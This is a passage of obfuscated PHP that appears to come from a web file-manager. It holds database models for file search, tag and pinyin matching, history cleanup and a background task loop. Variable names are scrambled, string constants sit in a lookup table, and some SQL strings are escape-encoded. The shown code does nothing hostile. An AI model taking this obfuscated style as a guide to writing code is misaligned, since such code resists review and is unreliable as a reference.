$_SERVER[ßğøİ]; $®”æ¹ìı = Model($ßÄŒàµ´[822])->sourceInfo($¨¬¼¢); $this->addHistory($®”æ¹ìı, LNG($ßÄŒàµ´[2078])); $œ•Ê©‰Í = $this->find($×¯Ùïı—); $€µ…×˜² = array($ßÄŒàµ´[468] => $œ•Ê©‰Í[$ßÄŒàµ´[468]], $ßÄŒàµ´[76] => $œ•Ê©‰Í[$ßÄŒàµ´[76]], $ßÄŒàµ´[85] => time(), $ßÄŒàµ´[456] => USER_ID); Model($ßÄŒàµ´[822])->where(array($ßÄŒàµ´[402] => $¨¬¼¢))->save($€µ…×˜²); return $this->where(array($ßÄŒàµ´[419] => $×¯Ùïı—))->delete(); } public function clearSame($êïÉ•¤À) { $’´Æ‘°È =& $_SERVER[ßğøİ]; $ùÆå¸úó = $this->listData($êïÉ•¤À); $¡ÆšÙÙ· = array_to_keyvalue_group($ùÆå¸úó, $’´Æ‘°È[468]); $¦¯ŞøÂ³ = array(); $õ—ê¨ä¬ = array(); foreach ($¡ÆšÙÙ· as $Ö½ò†ÉÕ) { if (!$Ö½ò†ÉÕ || count($Ö½ò†ÉÕ) <= 1) { continue; } foreach ($Ö½ò†ÉÕ as $ïÚ„Æ—) { $¦¯ŞøÂ³[] = $ïÚ„Æ—[$’´Æ‘°È[468]]; $õ—ê¨ä¬[] = $ïÚ„Æ—[$’´Æ‘°È[399]]; } } if (!$õ—ê¨ä¬) { return; } $this->where(array($’´Æ‘°È[399] => array($’´Æ‘°È[7], $õ—ê¨ä¬)))->delete(); Model($’´Æ‘°È[471])->remove($¦¯ŞøÂ³); } public function userSpace() { $Èèâ†ŸÅ =& $_SERVER[ßğøİ]; $á’œşÑı = $this->tablePrefix; $ÀŸ¼»© = array($Èèâ†ŸÅ[1646] => USER_ID); $Ç¹“§‹  = "{$á’œşÑı}\x69\157\x5f\x66\151\x6c\x65\x20\146\x69\x6c\x65\x73\x20\x6f\156\40\x66\x69\154\145\163\x2e\x66\151\154\145\x49\104\40\75\x20\x68\151\x73\164\157\162\171\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($Èèâ†ŸÅ[2076])->where($ÀŸ¼»©)->join($Ç¹“§‹ , $Èèâ†ŸÅ[2077])->sum($Èèâ†ŸÅ[76]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($„Òõâé’) { $ûÖÃíÒı =& $_SERVER[ßğøİ]; $Ò£«±ñ™ = KodIO::fileTypeList(); $¦ş™÷³‹ = $Ò£«±ñ™[$„Òõâé’]; if (!$¦ş™÷³‹) { return array(); } $èÏ³ü¢ = $¦ş™÷³‹[$ûÖÃíÒı[174]]; $·Ù¸æã¾ = $ûÖÃíÒı[7]; if (!$¦ş™÷³‹[$ûÖÃíÒı[174]]) { $´šğÑœÎ = array_to_keyvalue($Ò£«±ñ™, $ûÖÃíÒı[12], $ûÖÃíÒı[174]); $èÏ³ü¢ = implode($ûÖÃíÒı[50], $´šğÑœÎ); $·Ù¸æã¾ = $ûÖÃíÒı[2079]; } $äë£ûÄµ = explode($ûÖÃíÒı[50], trim($èÏ³ü¢, $ûÖÃíÒı[50])); return array($·Ù¸æã¾, $äë£ûÄµ); } public function listPathType($±²Âä¬») { $š®²˜”å =& $_SERVER[ßğøİ]; $äšñõƒ = $this->fileTypeWhere($±²Âä¬»); if (!$äšñõƒ) { return array(); } $öıĞç½œ = USER_ID; $éšÜÌ×ß = Model($š®²˜”å[535])->getInfo($öıĞç½œ); $¨‚æ…Ş² = array($š®²˜”å[586] => SourceModel::TYPE_USER, $š®²˜”å[521] => array($š®²˜”å[550], $š®²˜”å[531] . $éšÜÌ×ß[$š®²˜”å[86]][$š®²˜”å[402]] . $š®²˜”å[551]), $š®²˜”å[587] => $öıĞç½œ, $š®²˜”å[583] => 0, $š®²˜”å[584] => $äšñõƒ); return $this->listSource($¨‚æ…Ş²); } public function listSearch($‚ÍĞ¨†´, $¿Ã â£¶ = 300) { $ˆÑÂÈû½ =& $_SERVER[ßğøİ]; if (isset($‚ÍĞ¨†´[$ˆÑÂÈû½[1922]]) && $‚ÍĞ¨†´[$ˆÑÂÈû½[1922]]) { $‚ÍĞ¨†´[$ˆÑÂÈû½[1922]] = str_replace($ˆÑÂÈû½[384], $ˆÑÂÈû½[2080], trim($‚ÍĞ¨†´[$ˆÑÂÈû½[1922]])); } $Åûü¨ıÇ = $this->_parseSearchWhere($‚ÍĞ¨†´); if (!isset($Åûü¨ıÇ[$ˆÑÂÈû½[431]])) { $Åûü¨ıÇ[$ˆÑÂÈû½[431]] = 0; } $™™Ğü€® = $ˆÑÂÈû½[2081]; $ØŞî“Çæ = $Åûü¨ıÇ; $Ç¼ÚÕœ” = $™™Ğü€®; $this->_listSearchBindPinyin($‚ÍĞ¨†´, $Åûü¨ıÇ, $™™Ğü€®); $this->alias($ˆÑÂÈû½[446])->_makeOrder(); $Åûü¨ıÇ = $this->parseWhereLike($Åûü¨ıÇ); $ïÍÕÔÍ¶ = $this->distinct(!0)->field($™™Ğü€®)->where($Åûü¨ıÇ)->selectPage($¿Ã â£¶); if ($GLOBALS[$ˆÑÂÈû½[6]][$ˆÑÂÈû½[381]][$ˆÑÂÈû½[382]] && Input::check($‚ÍĞ¨†´[$ˆÑÂÈû½[1922]], $ˆÑÂÈû½[593]) && $ïÍÕÔÍ¶[$ˆÑÂÈû½[366]][$ˆÑÂÈû½[353]] == 1 && $ïÍÕÔÍ¶[$ˆÑÂÈû½[366]][$ˆÑÂÈû½[367]] == 0) { $ïÍÕÔÍ¶ = $this->distinct(!0)->field($™™Ğü€®)->where($ØŞî“Çæ)->limit(1000)->select(); $ïÍÕÔÍ¶ = array_page_split($ïÍÕÔÍ¶, !1, $¿Ã â£¶); } $this->_listSearchFileContent($ïÍÕÔÍ¶, $‚ÍĞ¨†´, $Ç¼ÚÕœ”, $ØŞî“Çæ); $this->_listSearchDesc($ïÍÕÔÍ¶, $‚ÍĞ¨†´, $Ç¼ÚÕœ”); $this->_listSearchTag($ïÍÕÔÍ¶, $‚ÍĞ¨†´, $Ç¼ÚÕœ”); $this->_listSearchGroupTag($ïÍÕÔÍ¶, $‚ÍĞ¨†´, $Ç¼ÚÕœ”); $this->_listDataApply($ïÍÕÔÍ¶[$ˆÑÂÈû½[369]]); $this->_listMake($ïÍÕÔÍ¶); return $ïÍÕÔÍ¶; } private function _listSearchFileContent(&$˜ô®—ï, $À¡ñÜ¼«, $¼ğ¯åÃŞ, $Ü•£âæ’) { $—÷´°² =& $_SERVER[ßğøİ]; if (!$À¡ñÜ¼«[$—÷´°²[1922]] || $˜ô®—ï[$—÷´°²[366]][$—÷´°²[353]] > 1) { return; } if (!isset($Ü•£âæ’[$—÷´°²[32]]) || !is_array($À¡ñÜ¼«[$—÷´°²[468]])) { return; } $Ü•£âæ’[$—÷´°²[468]] = array($—÷´°²[7], $À¡ñÜ¼«[$—÷´°²[468]]); unset($Ü•£âæ’[$—÷´°²[32]]); unset($À¡ñÜ¼«[$—÷´°²[468]]); $…Ğ·¯ª = $this->field($¼ğ¯åÃŞ)->where($Ü•£âæ’)->limit($—÷´°²[2082])->select(); if (!$…Ğ·¯ª || count($…Ğ·¯ª) == 0) { return; } $˜ô®—ï[$—÷´°²[369]] = array_merge($…Ğ·¯ª, $˜ô®—ï[$—÷´°²[369]]); $˜ô®—ï[$—÷´°²[366]][$—÷´°²[367]] += count($…Ğ·¯ª); } private function _listSearchTag(&$ŒÏ¡à‘Ğ, $÷×Ú˜ç§, $îÆ²Ûê) { $ù‹Ş¢ÅÈ =& $_SERVER[ßğøİ]; if (!$÷×Ú˜ç§[$ù‹Ş¢ÅÈ[1922]] || $ŒÏ¡à‘Ğ[$ù‹Ş¢ÅÈ[366]][$ù‹Ş¢ÅÈ[353]] > 1) { return; } $÷‡“‘íİ = Model($ù‹Ş¢ÅÈ[2083])->listData(); $æ¤‘ø³š = array(); $ŸÔÇœÒˆ = $÷×Ú˜ç§[$ù‹Ş¢ÅÈ[1922]]; foreach ($÷‡“‘íİ as $øÃ£³¹ª) { $é©ô§×î = $øÃ£³¹ª[$ù‹Ş¢ÅÈ[32]]; $ÆÎµ™•µ = str_replace($ù‹Ş¢ÅÈ[53], $ù‹Ş¢ÅÈ[12], Pinyin::get($é©ô§×î)); if (stripos($é©ô§×î, $ŸÔÇœÒˆ) !== !1 || stripos($ÆÎµ™•µ, $ŸÔÇœÒˆ) !== !1) { $æ¤‘ø³š[] = $øÃ£³¹ª[$ù‹Ş¢ÅÈ[399]]; } } if (!$æ¤‘ø³š) { return; } $¿¯Í· = array($ù‹Ş¢ÅÈ[426] => array($ù‹Ş¢ÅÈ[7], $æ¤‘ø³š), $ù‹Ş¢ÅÈ[1655] => USER_ID); $‡˜ø˜ê = Model($ù‹Ş¢ÅÈ[428])->field($ù‹Ş¢ÅÈ[84])->where($¿¯Í·)->select(); $‡˜ø˜ê = array_to_keyvalue($‡˜ø˜ê, $ù‹Ş¢ÅÈ[12], $ù‹Ş¢ÅÈ[84]); $Ü¸¤¢¬û = array_unique($‡˜ø˜ê); $this->_listSearchMerge($ŒÏ¡à‘Ğ, $÷×Ú˜ç§, $îÆ²Ûê, $Ü¸¤¢¬û); } private function _listSearchDesc(&$¼ˆÇ­üï, $äÑ„ÈÏ, $‘Ñ®Ç’‡) { $è—Ãçœ‹ =& $_SERVER[ßğøİ]; if (!$äÑ„ÈÏ[$è—Ãçœ‹[1922]] || $¼ˆÇ­üï[$è—Ãçœ‹[366]][$è—Ãçœ‹[353]] > 1) { return; } $ìà¨ø·² = array($è—Ãçœ‹[94] => $è—Ãçœ‹[453], $è—Ãçœ‹[374] => array($è—Ãçœ‹[383], $è—Ãçœ‹[1924] . $äÑ„ÈÏ[$è—Ãçœ‹[1922]] . $è—Ãçœ‹[1924])); $Ş…„Ìº = !1; if ($Ş…„Ìº) { $½º’É¥ = $this->listSearchChildren($äÑ„ÈÏ[$è—Ãçœ‹[432]]); $½º’É¥ = array_unique($½º’É¥); if (!$½º’É¥) { return; } $ìà¨ø·²[$è—Ãçœ‹[402]] = array($è—Ãçœ‹[7], $½º’É¥); } $ĞÍ¶ÆÌâ = Model($è—Ãçœ‹[569])->field($è—Ãçœ‹[402])->where($ìà¨ø·²)->limit(5000)->select(); $ôá ßà¥ = array_to_keyvalue($ĞÍ¶ÆÌâ, $è—Ãçœ‹[12], $è—Ãçœ‹[402]); $this->_listSearchMerge($¼ˆÇ­üï, $äÑ„ÈÏ, $‘Ñ®Ç’‡, $ôá ßà¥); } private function _listSearchGroupTag(&$„ò¡Ğ, $¢ì³ ¸Ô, $˜ñÈ·¡¡) { $šâèİ¥ =& $_SERVER[ßğøİ]; if (!$¢ì³ ¸Ô[$šâèİ¥[1922]] || $„ò¡Ğ[$šâèİ¥[366]][$šâèİ¥[353]] > 1 || !$¢ì³ ¸Ô[$šâèİ¥[432]]) { return; } $Àä¬ Öô = $this->sourceInfo($¢ì³ ¸Ô[$šâèİ¥[432]]); if (!$Àä¬ Öô || $Àä¬ Öô[$šâèİ¥[411]] != SourceModel::TYPE_GROUP) { return; } $¯ö¿†§ = $Àä¬ Öô[$šâèİ¥[505]]; $ïĞ¨Âé‹ = Model($šâèİ¥[2084])->get($¯ö¿†§); $©ö±ü¿ = array(); $ıªÕ‹È = $¢ì³ ¸Ô[$šâèİ¥[1922]]; foreach ($ïĞ¨Âé‹[$šâèİ¥[369]] as $ï¹Äìí) { $“†ÒƒÌ¢ = $ï¹Äìí[$šâèİ¥[32]]; $ƒ¤ò¡º = str_replace($šâèİ¥[53], $šâèİ¥[12], Pinyin::get($“†ÒƒÌ¢)); if (stripos($“†ÒƒÌ¢, $ıªÕ‹È) !== !1 || stripos($ƒ¤ò¡º, $ıªÕ‹È) !== !1) { $©ö±ü¿[] = $ï¹Äìí[$šâèİ¥[399]]; } } if (!$©ö±ü¿) { return; } $›Ö§¸ùı = array($šâèİ¥[426] => array($šâèİ¥[7], $©ö±ü¿), $šâèİ¥[1655] => 0, $šâèİ¥[33] => $šâèİ¥[1944] . $¯ö¿†§); $àİüƒ—ê = Model($šâèİ¥[428])->field($šâèİ¥[84])->where($›Ö§¸ùı)->select(); $àİüƒ—ê = array_to_keyvalue($àİüƒ—ê, $šâèİ¥[12], $šâèİ¥[84]); $µİõìóº = array_unique($àİüƒ—ê); $this->_listSearchMerge($„ò¡Ğ, $¢ì³ ¸Ô, $˜ñÈ·¡¡, $µİõìóº); } private function _listSearchMerge(&$³ÌĞ¢ŒÂ, $¼¹Ñë†ó, $¥ŞÆçğÕ, $ëå¡”‚») { $šÎ÷øıÑ =& $_SERVER[ßğøİ]; if (!$ëå¡”‚») { return; } $¨¥¬ûòñ = array_to_keyvalue($³ÌĞ¢ŒÂ[$šÎ÷øıÑ[369]], $šÎ÷øıÑ[12], $šÎ÷øıÑ[402]); $˜°€µ… = array_diff($ëå¡”‚», $¨¥¬ûòñ); if (!$˜°€µ…) { return; } $û·ºÛò† = array($šÎ÷øıÑ[402] => array($šÎ÷øıÑ[7], $˜°€µ…)); $œå˜ƒÑ¨ = $this->field($¥ŞÆçğÕ)->where($û·ºÛò†)->select(); if (!$œå˜ƒÑ¨) { return; } $îË¨Îî¿ = array(); foreach ($œå˜ƒÑ¨ as $Ö»ş›) { if ($this->_listSearchFilter($Ö»ş›, $¼¹Ñë†ó)) { $îË¨Îî¿[] = $Ö»ş›; } } $³ÌĞ¢ŒÂ[$šÎ÷øıÑ[369]] = array_merge($îË¨Îî¿, $³ÌĞ¢ŒÂ[$šÎ÷øıÑ[369]]); $³ÌĞ¢ŒÂ[$šÎ÷øıÑ[366]][$šÎ÷øıÑ[367]] += count($îË¨Îî¿); } private function _listSearchFilter($©‚Ú†„ç, $Ì§ ³¹š) { $’æå´Óß =& $_SERVER[ßğøİ]; $¯âí …ù = $©‚Ú†„ç[$’æå´Óß[410]] == $’æå´Óß[88]; if (!strstr($©‚Ú†„ç[$’æå´Óß[521]], $’æå´Óß[50] . $Ì§ ³¹š[$’æå´Óß[432]] . $’æå´Óß[50])) { return !1; } if (isset($Ì§ ³¹š[$’æå´Óß[412]]) && $Ì§ ³¹š[$’æå´Óß[412]] != $’æå´Óß[1883]) { if ($Ì§ ³¹š[$’æå´Óß[412]] == $’æå´Óß[75] && !$¯âí …ù) { return !1; } if ($Ì§ ³¹š[$’æå´Óß[412]] != $’æå´Óß[75] && $¯âí …ù) { return !1; } if (!strstr($©‚Ú†„ç[$’æå´Óß[174]], $’æå´Óß[50] . $Ì§ ³¹š[$’æå´Óß[412]] . $’æå´Óß[50])) { return !1; } } if (isset($Ì§ ³¹š[$’æå´Óß[2085]]) && $Ì§ ³¹š[$’æå´Óß[2085]] < $©‚Ú†„ç[$’æå´Óß[76]]) { return !1; } if (isset($Ì§ ³¹š[$’æå´Óß[2086]]) && $Ì§ ³¹š[$’æå´Óß[2086]] > $©‚Ú†„ç[$’æå´Óß[76]]) { return !1; } if (isset($Ì§ ³¹š[$’æå´Óß[600]]) && $Ì§ ³¹š[$’æå´Óß[600]] != $©‚Ú†„ç[$’æå´Óß[456]]) { return !1; } return !0; } public function listSearchChildren($ÇİÎÈ©, $ğ”Ê•à¬ = 5000) { $ Õ–äºû =& $_SERVER[ßğøİ]; $ûÂˆİºœ = array(); $‡ì¼°Å = $this->sourceInfo($ÇİÎÈ©); $ºŞ±óè = array($ Õ–äºû[521] => array($ Õ–äºû[383], $‡ì¼°Å[$ Õ–äºû[521]] . $‡ì¼°Å[$ Õ–äºû[402]] . $ Õ–äºû[551])); $–ïÏŠÏ± = $this->field($ Õ–äºû[76])->where($ºŞ±óè)->limit($ğ”Ê•à¬ + 1)->select(); $õáòÓ¼è = is_array($–ïÏŠÏ±) ? count($–ïÏŠÏ±) : 0; if ($õáòÓ¼è > $ğ”Ê•à¬) { return $this->_listSearchChildrenNear($ÇİÎÈ©, $ğ”Ê•à¬); } $ƒÄÑ´ˆ = $this->field($ Õ–äºû[402])->where($ºŞ±óè)->select(); $ûÂˆİºœ = array_to_keyvalue($ƒÄÑ´ˆ, $ Õ–äºû[12], $ Õ–äºû[402]); return $ûÂˆİºœ; } private function _listSearchChildrenNear($†„¬®›¹, $ë•‹¯¼”) { $Ëæ†¹Ô =& $_SERVER[ßğøİ]; $”ÄÅîåß = array(); $šéŞ–Õ® = array($Ëæ†¹Ô[432] => $†„¬®›¹); $ïšÕáû = $this->field($Ëæ†¹Ô[2087])->where($šéŞ–Õ®)->select(); $ü—©Ê©½ = array_to_keyvalue(array_filter_by_field($ïšÕáû, $Ëæ†¹Ô[410], $Ëæ†¹Ô[88]), $Ëæ†¹Ô[12], $Ëæ†¹Ô[402]); $”ÄÅîåß = array_merge($”ÄÅîåß, array_to_keyvalue($ïšÕáû, $Ëæ†¹Ô[12], $Ëæ†¹Ô[402])); if (!$ü—©Ê©½) { return $”ÄÅîåß; } $šéŞ–Õ® = array($Ëæ†¹Ô[432] => array($Ëæ†¹Ô[7], $ü—©Ê©½)); $ïšÕáû = $this->field($Ëæ†¹Ô[2087])->where($šéŞ–Õ®)->limit($ë•‹¯¼”)->select(); $”ÄÅîåß = array_merge($”ÄÅîåß, array_to_keyvalue($ïšÕáû, $Ëæ†¹Ô[12], $Ëæ†¹Ô[402])); $”ÄÅîåß = array_slice($”ÄÅîåß, 0, $ë•‹¯¼”); return $”ÄÅîåß; } private function _listSearchBindPinyin($•÷ßşûë, &$å±‹ä, &$ºÍşÓ†æ) { $˜“Ô³Ô =& $_SERVER[ßğøİ]; if (!isset($•÷ßşûë[$˜“Ô³Ô[1922]]) || !$•÷ßşûë[$˜“Ô³Ô[1922]]) { return; } if (!Input::check($•÷ßşûë[$˜“Ô³Ô[1922]], $˜“Ô³Ô[318]) || strlen($•÷ßşûë[$˜“Ô³Ô[1922]]) < 2) { return; } $Š…ïğ Ã = "\114\x45\106\x54\x20\x4a\117\111\x4e\40{$this->tablePrefix}\151\157\137\163\x6f\x75\162\x63\x65\137\155\x65\164\x61\x20\x6d\x65\x74\141\x20\157\x6e\40\x73\x6f\165\162\143\x65\x2e\x73\157\165\162\143\145\111\104\x20\x3d\x20\155\145\x74\x61\56\163\157\165\x72\x63\x65\x49\x44"; $ÉşÙÊÙæ = array(); $ºÍşÓ†æ = str_replace(array($˜“Ô³Ô[231], $˜“Ô³Ô[53], $˜“Ô³Ô[2088]), $˜“Ô³Ô[12], $ºÍşÓ†æ); $ºÍşÓ†æ = $˜“Ô³Ô[438] . str_replace($˜“Ô³Ô[50], $˜“Ô³Ô[439], $ºÍşÓ†æ); $ç÷¥ç´ = $å±‹ä[$˜“Ô³Ô[32]]; unset($å±‹ä[$˜“Ô³Ô[32]]); foreach ($å±‹ä as $ €£ÌĞ“ => $—±ÁòÇ¶) { $ÉşÙÊÙæ[$˜“Ô³Ô[438] . $ €£ÌĞ“] = $—±ÁòÇ¶; } foreach ($ç÷¥ç´ as $“Æ¸Øà‡) { $ÉşÙÊÙæ[] = array($˜“Ô³Ô[443] => $“Æ¸Øà‡, $˜“Ô³Ô[1000] => $˜“Ô³Ô[1926], array($˜“Ô³Ô[2089] => $“Æ¸Øà‡, $˜“Ô³Ô[2090] => array($˜“Ô³Ô[7], array($˜“Ô³Ô[465], $˜“Ô³Ô[464])))); } $this->join($Š…ïğ Ã); $å±‹ä = $ÉşÙÊÙæ; } private function _parseSearchWhere($ÓëÔÇ›) { $Á¡µå©Ü =& $_SERVER[ßğøİ]; $âãó£êš = array(); if (isset($ÓëÔÇ›[$Á¡µå©Ü[758]]) && $ÓëÔÇ›[$Á¡µå©Ü[758]]) { $âãó£êš[$Á¡µå©Ü[85]] = array($Á¡µå©Ü[2091], $ÓëÔÇ›[$Á¡µå©Ü[758]]); } if (isset($ÓëÔÇ›[$Á¡µå©Ü[497]]) && $ÓëÔÇ›[$Á¡µå©Ü[497]]) { $›Ì¨Üãú = array($Á¡µå©Ü[2092], $ÓëÔÇ›[$Á¡µå©Ü[497]]); if ($âãó£êš[$Á¡µå©Ü[85]]) { $âãó£êš[$Á¡µå©Ü[85]] = array($âãó£êš[$Á¡µå©Ü[85]], $›Ì¨Üãú, $Á¡µå©Ü[2093]); } else { $âãó£êš[$Á¡µå©Ü[85]] = $›Ì¨Üãú; } } if (isset($ÓëÔÇ›[$Á¡µå©Ü[2085]]) && $ÓëÔÇ›[$Á¡µå©Ü[2085]] > 0) { $âãó£êš[$Á¡µå©Ü[76]] = array($Á¡µå©Ü[2091], $ÓëÔÇ›[$Á¡µå©Ü[2085]]); } if (isset($ÓëÔÇ›[$Á¡µå©Ü[2086]]) && $ÓëÔÇ›[$Á¡µå©Ü[2086]]) { $›Ì¨Üãú = array($Á¡µå©Ü[2092], $ÓëÔÇ›[$Á¡µå©Ü[2086]]); if ($âãó£êš[$Á¡µå©Ü[76]]) { $âãó£êš[$Á¡µå©Ü[76]] = array($âãó£êš[$Á¡µå©Ü[76]], $›Ì¨Üãú, $Á¡µå©Ü[2093]); } else { $âãó£êš[$Á¡µå©Ü[76]] = $›Ì¨Üãú; } } if (isset($ÓëÔÇ›[$Á¡µå©Ü[600]]) && $ÓëÔÇ›[$Á¡µå©Ü[600]]) { $âãó£êš[] = array($Á¡µå©Ü[456] => $ÓëÔÇ›[$Á¡µå©Ü[600]], $Á¡µå©Ü[454] => $ÓëÔÇ›[$Á¡µå©Ü[600]], $Á¡µå©Ü[1000] => $Á¡µå©Ü[1926]); } if (isset($ÓëÔÇ›[$Á¡µå©Ü[412]]) && $ÓëÔÇ›[$Á¡µå©Ü[412]]) { $æ²õìé = $ÓëÔÇ›[$Á¡µå©Ü[412]]; if ($æ²õìé == $Á¡µå©Ü[75]) { $âãó£êš[$Á¡µå©Ü[410]] = 1; } else { if ($æ²õìé == $Á¡µå©Ü[2094]) { $âãó£êš[$Á¡µå©Ü[410]] = 0; } else { if ($æ²õìé) { $æ²õìé = is_array($æ²õìé) ? $æ²õìé : explode($Á¡µå©Ü[50], $æ²õìé); $âãó£êš[$Á¡µå©Ü[412]] = array($Á¡µå©Ü[418], $æ²õìé); $âãó£êš[$Á¡µå©Ü[410]] = 0; } } } } $this->_parseSearchParent($ÓëÔÇ›, $âãó£êš); if (isset($ÓëÔÇ›[$Á¡µå©Ü[1922]]) && trim($ÓëÔÇ›[$Á¡µå©Ü[1922]])) { $¨¾ıŞÖÅ = trim($ÓëÔÇ›[$Á¡µå©Ü[1922]]); $éÁ¿êÛ = explode($Á¡µå©Ü[53], $¨¾ıŞÖÅ); if (strlen($¨¾ıŞÖÅ) > 2 && (substr($¨¾ıŞÖÅ, 0, 1) == $Á¡µå©Ü[118] && substr($¨¾ıŞÖÅ, -1) == $Á¡µå©Ü[118]) || substr($¨¾ıŞÖÅ, 0, 1) == $Á¡µå©Ü[58] && substr($¨¾ıŞÖÅ, -1) == $Á¡µå©Ü[58]) { $¨¾ıŞÖÅ = substr($¨¾ıŞÖÅ, 1, -1); $éÁ¿êÛ = array($¨¾ıŞÖÅ); } $âãó£êš[$Á¡µå©Ü[32]] = array(array($Á¡µå©Ü[550], $Á¡µå©Ü[1924] . $¨¾ıŞÖÅ . $Á¡µå©Ü[1924])); if (count($éÁ¿êÛ) > 1) { $âãó£êš[$Á¡µå©Ü[32]] = array(); foreach ($éÁ¿êÛ as $¨Ò“­Ìè) { if (!trim($¨Ò“­Ìè)) { continue; } $âãó£êš[$Á¡µå©Ü[32]][] = array($Á¡µå©Ü[550], $Á¡µå©Ü[1924] . trim($¨Ò“­Ìè) . $Á¡µå©Ü[1924]); } } } return $âãó£êš; } private function _parseSearchParent($ş€Ö×¯¶, &$Ú®ß…ëë) { $ö§ÆˆÎŞ =& $_SERVER[ßğøİ]; if (!isset($ş€Ö×¯¶[$ö§ÆˆÎŞ[432]]) || !$ş€Ö×¯¶[$ö§ÆˆÎŞ[432]]) { return; } $íª‚ó°í = $this->pathInfo($ş€Ö×¯¶[$ö§ÆˆÎŞ[432]]); $ÇÌŸ¤¿™ = $íª‚ó°í[$ö§ÆˆÎŞ[432]] . $ö§ÆˆÎŞ[12] === $ö§ÆˆÎŞ[197]; $‚Ìß†¨õ = $íª‚ó°í[$ö§ÆˆÎŞ[411]] == $ö§ÆˆÎŞ[515]; if ($íª‚ó°í[$ö§ÆˆÎŞ[532]] == $ö§ÆˆÎŞ[533]) { $»àë‡í = $this->sourceInfo($ş€Ö×¯¶[$ö§ÆˆÎŞ[432]]); $íª‚ó°í[$ö§ÆˆÎŞ[521]] = $»àë‡í[$ö§ÆˆÎŞ[521]]; } $Ú®ß…ëë[$ö§ÆˆÎŞ[590]] = array($ö§ÆˆÎŞ[550], $íª‚ó°í[$ö§ÆˆÎŞ[521]] . $ş€Ö×¯¶[$ö§ÆˆÎŞ[432]] . $ö§ÆˆÎŞ[551]); $ûœò›ğû = isset($ş€Ö×¯¶[$ö§ÆˆÎŞ[1787]]) && in_array($ö§ÆˆÎŞ[515], $ş€Ö×¯¶[$ö§ÆˆÎŞ[1787]]); if (!$ûœò›ğû || !$‚Ìß†¨õ || !$ÇÌŸ¤¿™ || !$íª‚ó°í[$ö§ÆˆÎŞ[413]]) { return; } if (!AuthModel::authCheckRoot($íª‚ó°í[$ö§ÆˆÎŞ[413]][$ö§ÆˆÎŞ[414]])) { return; } $¬º‹æ²— = $íª‚ó°í[$ö§ÆˆÎŞ[505]] . $ö§ÆˆÎŞ[12]; if ($¬º‹æ²— == $ö§ÆˆÎŞ[88]) { unset($Ú®ß…ëë[$ö§ÆˆÎŞ[590]]); $Ú®ß…ëë[$ö§ÆˆÎŞ[411]] = self::TYPE_GROUP; return; } $ØË†¦• = Model($ö§ÆˆÎŞ[522])->groupChildrenAll($¬º‹æ²—); $ßÔ¾Ô = count($ØË†¦•); if ($ßÔ¾Ô <= 1) { return; } $ë­—š‘¢ = array($ö§ÆˆÎŞ[432] => 0, $ö§ÆˆÎŞ[411] => self::TYPE_GROUP, $ö§ÆˆÎŞ[505] => array($ö§ÆˆÎŞ[7], $ØË†¦•)); $†ù‡ÍÍ = $this->field($ö§ÆˆÎŞ[2095])->where($ë­—š‘¢)->limit($ßÔ¾Ô)->select(); $Ú®ß…ëë[$ö§ÆˆÎŞ[590]] = array(); foreach ($†ù‡ÍÍ as $ğÜÆÜÃü) { $Ú®ß…ëë[$ö§ÆˆÎŞ[590]][] = array($ö§ÆˆÎŞ[550], $ö§ÆˆÎŞ[531] . $ğÜÆÜÃü[$ö§ÆˆÎŞ[402]] . $ö§ÆˆÎŞ[551]); } $Ú®ß…ëë[$ö§ÆˆÎŞ[590]][] = $ö§ÆˆÎŞ[1926]; } } goto Aå´íç´ª; AœáÓçåï: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÜŒËı™• =& $_SERVER[ßğøİ]; if (self::valueGet($ÜŒËı™•[747]) != $ÜŒËı™•[88]) { return; } if (self::valueGet($ÜŒËı™•[1614]) == $ÜŒËı™•[88]) { $Ğ¾•ïÇ¥ = self::valueGet($ÜŒËı™•[1615]); if (time() - $Ğ¾•ïÇ¥ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$ÜŒËı™•[1616]] = 1; self::valueSet($ÜŒËı™•[1614], $ÜŒËı™•[88]); self::log($ÜŒËı™•[1617] . ACTION . $ÜŒËı™•[1618]); Session::$data = array(); Session::$sessionSign = $ÜŒËı™•[12]; $GLOBALS[$ÜŒËı™•[503]] = 1; Hook::bind($ÜŒËı™•[1619], $ÜŒËı™•[1620]); $¨ä‘Ö÷‘ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÜŒËı™•[747]) != $ÜŒËı™•[88]) { self::valueSet($ÜŒËı™•[1614], $ÜŒËı™•[197]); self::log($ÜŒËı™•[1621]); die; } $óœöõ¨ = time(); if ($óœöõ¨ - $¨ä‘Ö÷‘ >= 60) { self::valueSet(array($ÜŒËı™•[1614] => $ÜŒËı™•[88], $ÜŒËı™•[1615] => $óœöõ¨), !1); $¨ä‘Ö÷‘ = $óœöõ¨; } if (!file_exists(USER_SYSTEM . $ÜŒËı™•[1622])) { self::valueSet(array($ÜŒËı™•[1614] => $ÜŒËı™•[197], $ÜŒËı™•[747] => $ÜŒËı™•[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ø´¥ñ¦î =& $_SERVER[ßğøİ]; http_close(); self::valueSet($ø´¥ñ¦î[747], $ø´¥ñ¦î[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ø´¥ñ¦î[1614] => $ø´¥ñ¦î[197], $ø´¥ñ¦î[747] => $ø´¥ñ¦î[88]), !1); } public static function taskSwitch() { $Ü²ò± =& $_SERVER[ßğøİ]; $¾äÆÁ˜ = self::valueGet($Ü²ò±[747]) == $Ü²ò±[88] ? $Ü²ò±[197] : $Ü²ò±[88]; self::valueSet($Ü²ò±[747], $¾äÆÁ˜); } public static function shutdownEvent() { $í¹ÔÒŸ =& $_SERVER[ßğøİ]; self::valueSet($í¹ÔÒŸ[1614], $í¹ÔÒŸ[197]); self::log($í¹ÔÒŸ[1623]); } public static function config($ë¹‹¸Ë, $âÌËî®©) { self::valueSet($_SERVER[ßğøİ][747], $ë¹‹¸Ë); } private static function taskRunAll() { $ìñî„ğš =& $_SERVER[ßğøİ]; $Õ“¹¬¾ë = timeFloat(); $‰ñœû = Model($ìñî„ğš[1624])->listData(); $˜æ¬Íï´ = count($‰ñœû); for ($ßæ‘ø¾¹ = 0; $ßæ‘ø¾¹ < $˜æ¬Íï´; $ßæ‘ø¾¹++) { $Ã®¦ß¨ã = $‰ñœû[$ßæ‘ø¾¹]; if (!$Ã®¦ß¨ã[$ìñî„ğš[399]] || 